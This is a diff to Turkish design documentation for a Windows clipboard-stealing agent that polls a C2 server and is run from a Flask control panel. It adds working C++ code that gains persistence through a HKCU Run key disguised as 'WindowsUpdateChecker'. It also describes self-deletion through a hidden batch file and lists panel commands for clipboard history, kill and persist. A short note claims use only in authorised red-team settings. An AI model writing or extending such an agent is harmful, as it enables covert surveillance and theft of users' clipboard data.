@@ -156,7 +156,7 @@ static const char* C2_HOST   = "127.0.0.1";    // C2 sunucu adresi — build_age
 static const int   C2_PORT   = 5000;            // C2 sunucu portu  — build_agent() tarafından yazılır
 static const int   POLL_MS   = 3000;            // Komut polling aralığı (ms)
 static const char* REG_PATH  = "Software\\Microsoft\\Windows\\CurrentVersion\\ClipAgent";
-static const char* TASK_NAME = "WindowsUpdateChecker"; // Scheduled task adı
+static const char* TASK_NAME = "WindowsUpdateChecker"; // HKCU Run değer adı (persistence)
 static const size_t MAX_FILE = 50 * 1024 * 1024;       // Dosya yükleme limiti (50MB)
 
 static std::string   g_agentId;        // Kalıcı unique ID (registry'den yüklenir)
@@ -213,9 +213,13 @@ Harici JSON kütüphanesi olmadan iki minimal fonksiyon:
 // " \ \n \r \t karakterlerini escape eder
 static std::string JsonEscape(const std::string& s);
 
-// {"command":"kill"} → "kill" — komut yanıtını parse eder
+// Flask'ın "key": "value" formatını parse eder (kolon sonrası boşluk toleranslı)
 static std::string JsonGetString(const std::string& json, const std::string& key);
 ```
+
+> **Neden özel parser?** Flask'ın `jsonify` çıktısı `{"key": "value"}` üretir (kolon sonrası boşluk).
+> Standart `"key":"` araması her zaman `npos` döndürür. Parser kolon ile açılış tırnağı
+> arasındaki tüm boşluk/tab karakterlerini atlayarak her iki formatı da doğru parse eder.
 
 ### 4.8 HTTP İletişimi (WinINet)
 
@@ -290,13 +294,14 @@ bfh.bfSize    = sizeof(BITMAPFILEHEADER) + dataSize;
 
 ```
 1. RegDeleteKeyA(HKCU, REG_PATH)     → Agent ID'yi registry'den sil
-2. GetModuleFileNameA()               → Kendi EXE yolunu al
-3. %TEMP%\cleanup_<PID>.bat oluştur:
+2. RegDeleteValueA(HKCU, Run key)    → Persistence Run değerini sil (varsa)
+3. GetModuleFileNameA()               → Kendi EXE yolunu al
+4. %TEMP%\cleanup_<PID>.bat oluştur:
        ping 127.0.0.1 -n 4 >nul      → Process çıkana kadar ~3s bekle
        del /f /q "<exePath>"          → EXE'yi sil
        del /f /q "%~f0"              → Batch dosyasını da sil
-4. ShellExecuteA("open", batPath, SW_HIDE) → Batch'i gizli başlat
-5. ExitProcess(0)                    → Process sonlan
+5. ShellExecuteA("open", batPath, SW_HIDE) → Batch'i gizli başlat
+6. ExitProcess(0)                    → Process sonlan
 ```
 
 > **Bilinen kısıt:** Windows 10/11'de `.bat` dosyasını `ShellExecuteA("open", ...)` ile  
@@ -306,19 +311,34 @@ bfh.bfSize    = sizeof(BITMAPFILEHEADER) + dataSize;
 
 ### 4.14 Kalıcılık (Persist)
 
-```cpp
-// schtasks /create
-//   /tn "WindowsUpdateChecker"   → Görev adı (görünürde masum)
-//   /tr "\"<exePath>\""          → Çalıştırılacak dosya
-//   /sc onlogon                  → Her kullanıcı girişinde tetikle
-//   /rl highest                  → En yüksek yetkiyle çalıştır
-//   /f                           → Varsa üzerine yaz
+HKCU Run registry key ile kalıcılık sağlanır — yönetici yetkisi gerekmez.
 
-CreateProcessA(..., CREATE_NO_WINDOW, ...);
-WaitForSingleObject(pi.hProcess, 5000);
+```cpp
+static void AddPersistence()
+{
+    char exePath[MAX_PATH] = {};
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+
+    // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    // Her kullanıcı girişinde tetiklenir; admin yetkisi gerekmez.
+    HKEY hKey = NULL;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, TASK_NAME, 0, REG_SZ,
+                       (const BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
+        RegCloseKey(hKey);
+    }
+}
 ```
 
-Elle kaldırma: `schtasks /delete /tn "WindowsUpdateChecker" /f`
+**Yazılan registry yolu:**  
+`HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateChecker` = `<EXE yolu>`
+
+Elle kaldırma:
+```cmd
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f
+```
 
 ### 4.15 Komut Polling Thread'i
 
@@ -692,7 +712,7 @@ else:                                → "text"  (plain panel)
 
   [1] View clipboard history
   [2] Send KILL command  (self-destruct + delete)
-  [3] Send PERSIST command  (add scheduled task)
+  [3] Send PERSIST command  (add Run registry key)
   [4] Delete this agent from DB
   [0] Back
 ```
@@ -858,8 +878,8 @@ Bu araç yalnızca **yetkilendirilmiş** ortamlarda (penetration testing, red te
 
 ```
 Agent tarafı:
-  kill komutu     → registry + EXE silinir
-  Scheduled task  → schtasks /delete /tn "WindowsUpdateChecker" /f
+  kill komutu     → registry + Run key + EXE silinir
+  Persistence     → reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f
 
 C2 tarafı:
   Tek agent sil   → Agent Menüsü → [4]
